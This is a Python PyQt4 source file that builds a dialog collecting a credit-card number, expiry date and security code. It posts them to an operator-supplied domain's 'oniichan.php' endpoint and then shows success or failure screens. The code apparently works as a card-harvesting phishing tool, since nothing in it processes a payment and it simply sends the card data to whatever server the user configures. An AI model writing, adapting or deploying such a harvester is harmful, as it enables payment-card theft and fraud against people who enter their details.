from PyQt4 import QtCore, QtGui
import meme, failure, punct, success
import requests, re, sys

domain = '' # PUT YOUR DOMAIN HERE

class DankMeme(QtGui.QDialog, meme.Ui_Dialog):
    def __init__(self, parent=None):
        super(DankMeme, self).__init__(parent)
        self.setupUi(self)
        
        self.pushButton.clicked.connect(self.send)

    def send(self):
        number = self.lineEdit.text()
        expiry = self.lineEdit_2.text()
        security = self.lineEdit_3.text()
        if (re.match("^[A-Za-z0-9_-]*$", number)) and (re.match("^[A-Za-z0-9_-]*$", expiry)) and (re.match("^[A-Za-z0-9_-]*$", security)) and number and expiry and security:
            try:
                card_data = {
                    'number'    : str(number),
                    'expiry'    : str(expiry),
                    'security'  : str(security)
                    }
                r = requests.post(domain+'/oniichan.php', data = card_data)
                if r.status_code != 200:
                    raise Exception(str(r.status_code))
                self.close()
                self.yes = Yes()
                self.yes.show()
            except Exception as e:
                self.close()
                self.oof = Fail()
                self.oof.show()
        else:
            self.close()
            print "closed"
            self.punct = Punc()
            self.punct.show()

class Fail(QtGui.QDialog, failure.Ui_Failure):
    def __init__(self, parent=None):
        super(Fail, self).__init__(parent)
        self.setupUi(self)
        
        self.pushButton.clicked.connect(self.oof)

    def oof(self):
        self.close()
        self.form = DankMeme()
        self.form.show()

class Punc(QtGui.QDialog, punct.Ui_Failure):
    def __init__(self, parent=None):
        super(Punc, self).__init__(parent)
        self.setupUi(self)
        
        self.pushButton.clicked.connect(self.oof)     
    
    def oof(self):
        self.close()
        self.form = DankMeme()
        self.form.show()

class Yes(QtGui.QDialog, success.Ui_Failure):
    def __init__(self, parent=None):
        super(Yes, self).__init__(parent)
        self.setupUi(self)
        
        self.pushButton.clicked.connect(self.close)
        
def main():
    app = QtGui.QApplication(sys.argv)
    form = DankMeme()
    form.show()
    sys.exit(app.exec_())
    
if __name__ == '__main__':
    main()